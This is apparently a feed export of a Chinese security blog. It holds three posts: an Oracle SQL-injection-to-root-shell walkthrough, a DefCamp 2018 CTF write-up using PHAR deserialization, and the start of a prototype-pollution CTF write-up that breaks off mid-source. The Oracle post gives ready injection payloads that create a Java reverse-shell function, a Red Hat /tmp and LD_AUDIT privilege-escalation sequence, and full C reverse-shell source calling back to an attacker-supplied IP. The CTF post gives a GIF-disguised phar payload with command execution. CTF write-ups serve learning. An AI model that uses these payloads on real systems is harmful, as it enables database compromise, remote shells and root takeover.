class="hljs-string">'FOO'</span>,<span class="hljs-string">'BAR'</span>,<span class="hljs-string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--'</span>,<span class="hljs-string">'SYS'</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-comment">--</span></span><br></pre></td></tr></table></figure></p><h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (<span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">'FOO'</span>,<span class="hljs-string">'BAR'</span>,<span class="hljs-string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--'</span>,<span class="hljs-string">'SYS'</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-comment">--</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里创建了一个叫<code>reversetcp</code>的函数，函数里引用了上面我们创建的<code>shell</code>类(<code>shell.run()</code>)。</p><h3 id="赋予函数执行权限"><a href="#赋予函数执行权限" class="headerlink" title="赋予函数执行权限"></a>赋予函数执行权限</h3><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (<span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">'FOO'</span>,<span class="hljs-string">'BAR'</span>,<span class="hljs-string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--'</span>,<span class="hljs-string">'SYS'</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-comment">--</span></span><br></pre></td></tr></table></figure><h3 id="执行reversetcp函数"><a href="#执行reversetcp函数" class="headerlink" title="执行reversetcp函数"></a>执行reversetcp函数</h3><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (<span class="hljs-keyword">select</span> sys.reversetcp <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-comment">--</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;至此，就能将shell反弹到你的VPS里。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>&emsp;&emsp;一般oracle的用户的权限不会太高，所以我们要提至root。</p><p>&emsp;&emsp;首先对目标服务器做个信息收集(截选)：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">oracle</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line">2.6.18</span><br><span class="line"></span><br><span class="line">cat /etc/issue</span><br><span class="line">Red Hat release 5.3</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;在redhat5-6的系统中存在<code>/tmp 777权限</code>提权的漏洞。</p><p>&emsp;&emsp;在/tmp下创建一个<code>.redhat</code>的目录：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir .redhat</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;接着利用<code>ping</code>这个命令，ping的权限很特殊是S，可以在普通用户使用这个命令的时候瞬间拥有这个命令的属主权限，这里是root.<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln /bin/ping /tmp/.redhat/target</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再接着：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">exec</span> 3&lt; /tmp/.redhat/target</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 删除</span></span><br><span class="line">rm -rf /tmp/.redhat/</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;接着找个<code>C语言</code>版的shell：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">()</span></span>;</span><br><span class="line"><span class="hljs-keyword">char</span> shell[]=<span class="hljs-string">"/bin/sh"</span>;</span><br><span class="line"><span class="hljs-keyword">char</span> message[]=<span class="hljs-string">"hacker welcomen"</span>;</span><br><span class="line"><span class="hljs-keyword">int</span> sock;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="hljs-keyword">if</span>(argc &lt;<span class="hljs-number">3</span>)&#123;</span><br><span class="line">usage(argv[<span class="hljs-number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span></span><br><span class="line"><span class="hljs-keyword">if</span>((sock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) == <span class="hljs-number">-1</span>) &#123;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Couldn't make socket!n"</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_port = htons(atoi(argv[<span class="hljs-number">2</span>]));</span><br><span class="line">server.sin_addr.s_addr = inet_addr(argv[<span class="hljs-number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(connect(sock, (struct sockaddr *)&amp;server, <span class="hljs-keyword">sizeof</span>(struct sockaddr)) == <span class="hljs-number">-1</span>) &#123;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Could not connect to remote shell!n"</span>);</span><br><span class="line"><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">send(sock, message, <span class="hljs-keyword">sizeof</span>(message), <span class="hljs-number">0</span>);</span><br><span class="line">dup2(sock, <span class="hljs-number">0</span>);</span><br><span class="line">dup2(sock, <span class="hljs-number">1</span>);</span><br><span class="line">dup2(sock, <span class="hljs-number">2</span>);</span><br><span class="line">execl(shell,<span class="hljs-string">"/bin/sh"</span>,(<span class="hljs-keyword">char</span> *)<span class="hljs-number">0</span>);</span><br><span class="line">close(sock);</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *prog[])</span> </span>&#123;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage: %s &lt;reflect ip&gt; &lt;port&gt;n"</span>, prog);</span><br><span class="line"><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;编译：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -w -fPIC -shared -o /tmp/.redhat oracle.c</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;运行：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;即可得到一个root shell：</p><div align="center"><br>    <img src="/images/posts/shentou/28.png"><br></div><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>&emsp;&emsp;<a href="http://blog.51cto.com/akhack/1741615" target="_blank">http://blog.51cto.com/akhack/1741615</a></p><p>&emsp;&emsp;<a href="https://www.cnblogs.com/chuanzifan/archive/2012/05/13/2497717.html" target="_blank">https://www.cnblogs.com/chuanzifan/archive/2012/05/13/2497717.html</a></p><p>&emsp;&emsp;<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p><p>&emsp;&emsp;<a href="https://www.iswin.org/2015/06/13/hack-oracle/" target="_blank">https://www.iswin.org/2015/06/13/hack-oracle/</a></p><p>&emsp;&emsp;<a href="https://blog.csdn.net/han_dongwei/article/details/40870197" target="_blank">https://blog.csdn.net/han_dongwei/article/details/40870197</a></p><p>&emsp;&emsp;<a href="https://github.com/jakubroztocil/httpie/blob/master/README.rst" target="_blank">HTTPie: a CLI, cURL-like tool for humans</a></p><p>&emsp;&emsp;<a href="https://www.t00ls.net/viewthread.php?tid=43881" target="_blank">https://www.t00ls.net/viewthread.php?tid=43881</a><br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;本文记录一下oracle从SQLi到get (root) shell的过程。首发于&lt;code&gt;T00ls&lt;/code&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Hack" scheme="http://yoursite.com/tags/Hack/"/>
    
      <category term="Oracle" scheme="http://yoursite.com/tags/Oracle/"/>
    
  </entry>
  
  <entry>
    <title>Defcamp(DCTF) 2018-Vulture phar反序列化攻击</title>
    <link href="http://yoursite.com/2018/09/defcamp-writeup2/"/>
    <id>http://yoursite.com/2018/09/defcamp-writeup2/</id>
    <published>2018-09-30T08:47:56.000Z</published>
    <updated>2018-11-23T12:44:13.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这是defcamp ctf 2018 vulture 的题解，使用的方法为利用phar拓展进行PHP反序列化攻击。<br><a id="more"></a></p><blockquote><p>We created an online service where you can upload pictures of vultures (or other birds). Each user has a feed so you can privately enjoy the photos you took of this majestic killing machines :)<br>Target: <a href="https://vulture.dctfq18.def.camp/" target="_blank" rel="noopener">https://vulture.dctfq18.def.camp/</a><br>Author: Anatol</p></blockquote><p>&emsp;&emsp;打开网站后发现是一个图片留言板一类的东西，用户可以上传一张图片和描述图片的文字。</p><p>&emsp;&emsp;经过测试后发现如果选择不存在的图片时会报<code>Image not found</code>的错误。所以这里很有可能使用了<code>file_exists</code>去检查文件是否存在。</p><div align="center"><br>    <img src="/images/posts/dctf/6.png"><br></div><br><div align="center"><br>    <img src="/images/posts/dctf/7.png"><br></div><br>&emsp;&emsp;在知道创宇的一篇<a href="https://paper.seebug.org/680/" target="_blank">文章</a>中提到过利用phar进行反序列化攻击的例子（这里不再赘述，建议直接看原文。）。而他的利用条件是：<br><div align="center"><br>    <img src="/images/posts/dctf/8.png"><br></div><br>&emsp;&emsp;在这道题中，题目的环境都满足利用条件。<br><br>&emsp;&emsp;在利用反序列化过程中需要找好可以任意代码执行的类，很显然，以目前的条件我们还得不到这样一个类。<br><br>&emsp;&emsp;当我们尝试访问一个不存在的页面时会爆出如下错误：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception: xxxController handler class cannot be loaded</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/dctf/9.png"><br></div><br>&emsp;&emsp;Google后可以发现这是一个叫<code>Phalcon</code>的PHP framework，而网上还有一个利器<code>PHPGGC: PHP Generic Gadget Chains</code>，它可以为我们生成ROP Gadget，类似于pwn。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/ambionics/phpggc</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;而这个项目里就含有这个框架的gadget。<br><div align="center"><br>    <img src="/images/posts/dctf/10.png"><br></div><br>&emsp;&emsp;接下来我们修改<code>gadgetchains/Phalcon/RCE/1/chain.php</code>：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">GadgetChain</span>\<span class="hljs-title">Phalcon</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RCE1</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">RCE</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> $version = <span class="hljs-string">'&lt;= 1.2.2'</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $vector = <span class="hljs-string">'__wakeup'</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $author = <span class="hljs-string">'Raz0r'</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $informations = <span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">        This chain does not expect parameters, will eval() any code supplied in</span></span><br><span class="line"><span class="hljs-string">        php://input (i.e. POST data). Requires allow_url_include = true.</span></span><br><span class="line"><span class="hljs-string">    '</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># No parameters expected</span></span><br><span class="line">    <span class="hljs-keyword">public</span> $parameters = [];</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span><span class="hljs-params">(array $parameters)</span></span></span><br><span class="line"><span class="hljs-function">    </span>&#123;</span><br><span class="line">        @unlink(<span class="hljs-string">'phar.phar'</span>);</span><br><span class="line">        $p = <span class="hljs-keyword">new</span> \Phar(<span class="hljs-string">'phar.phar'</span>);</span><br><span class="line">        $p-&gt;startBuffering();</span><br><span class="line">        $p-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php xxx; __HALT_COMPILER();?&gt;"</span>);</span><br><span class="line">        $p-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>);</span><br><span class="line">        $p-&gt;setMetadata(<span class="hljs-keyword">new</span> \Phalcon\Logger\Adapter\File());</span><br><span class="line">        $p-&gt;stopBuffering();</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> \Phalcon\Logger\Adapter\File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;使用<code>./phpggc  Phalcon/RCE1</code>得到exp：<br><div align="center"><br>    <img src="/images/posts/dctf/11.png"><br></div><br><div align="center"><br>    <img src="/images/posts/dctf/12.png"><br></div><br>&emsp;&emsp;可以看到生成的phar文件变成了GIF。我们将这个文件上传上去：<br><div align="center"><br>    <img src="/images/posts/dctf/13.png"><br></div><br>&emsp;&emsp;这里注意到结果是<code>false</code>但这并不影响我们使用，实际上已经上传成功了。<br><br>&emsp;&emsp;接着根据phpggc的提示:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This chain does not expect parameters, will eval() any code supplied in</span><br><span class="line">        php://input (i.e. POST data). Requires allow_url_include = true.</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;所以我们只需在post body里写命令执行的代码即可：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php die(`ls -la`);</span><br><span class="line">/*&amp;image=phar://uploads/5bb0ca3725e63.gif&amp;text=123</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/dctf/14.png"><br></div><br>&emsp;&emsp;这里注意需要在<code>image</code>的前面加<code>&amp;</code>，不然会造成错误。接着我们直接cat flag即可。<br><div align="center"><br>    <img src="/images/posts/dctf/15.png"><br></div><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>&emsp;&emsp;<a href="https://paper.seebug.org/680/" target="_blank">https://paper.seebug.org/680/</a></p><p>&emsp;&emsp;<a href="https://cyku.tw/ctf-defcamp-qualification-2018/" target="_blank">https://cyku.tw/ctf-defcamp-qualification-2018/</a><br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是defcamp ctf 2018 vulture 的题解，使用的方法为利用phar拓展进行PHP反序列化攻击。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Defcamp(DCTF) 2018-chat Prototype pollution attack</title>
    <link href="http://yoursite.com/2018/09/defcamp-dctf-2018-writeup/"/>
    <id>http://yoursite.com/2018/09/defcamp-dctf-2018-writeup/</id>
    <published>2018-09-29T08:47:56.000Z</published>
    <updated>2018-11-23T12:44:09.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是Defcamp CTF 2018中的一道web题(chat)题解，在deep <code>clone</code>的时候使用了<code>Prototype pollution attack</code>，原型污染攻击的方法解题。<br><a id="more"></a></p><p>&emsp;&emsp;拿到题目后可以得到客户端和服务端的源码，所以首先进行源码审计。server.js：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> fs       = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>); </span><br><span class="line"><span class="hljs-keyword">var</span> server   = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>).createServer()</span><br><span class="line"><span class="hljs-keyword">var</span> io       = <span class="hljs-built_in">require</span>(<span class="hljs-string">'socket.io'</span>)(server)</span><br><span class="line"><span class="hljs-keyword">var</span> clientManager = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./clientManager'</span>)</span><br><span class="line"><span class="hljs-keyword">var</span> helper = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./helper'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> defaultSettings = <span class="hljs-built_in">JSON</span>.parse(fs.readFileSync(<span class="hljs-string">'default_settings.json'</span>, <span class="hljs-string">'utf8'</span>));</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendMessageToClient</span>(<span class="hljs-params">client, from, message</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> msg = &#123;</span><br><span class="line">        <span class="hljs-keyword">from</span>: <span class="hljs-keyword">from</span>,</span><br><span class="line">        message: message</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    client.emit(<span class="hljs-string">'message'</span>, msg);</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(msg)</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendMessageToChannel</span>(<span class="hljs-params">channel, from, message</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> msg = &#123;</span><br><span class="line">        <span class="hljs-keyword">from</span>: <span class="hljs-keyword">typeof</span> <span class="hljs-keyword">from</span> !== <span class="hljs-string">'string'</span> ? clientManager.getUsername(<span class="hljs-keyword">from</span>): <span class="hljs-keyword">from</span>,</span><br><span class="line">        message: message,</span><br><span class="line">        channel: channel</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">from</span> !== <span class="hljs-string">'string'</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span>(!clientManager.isSubscribedTo(<span class="hljs-keyword">from</span>, channel)) &#123;</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'Could not send 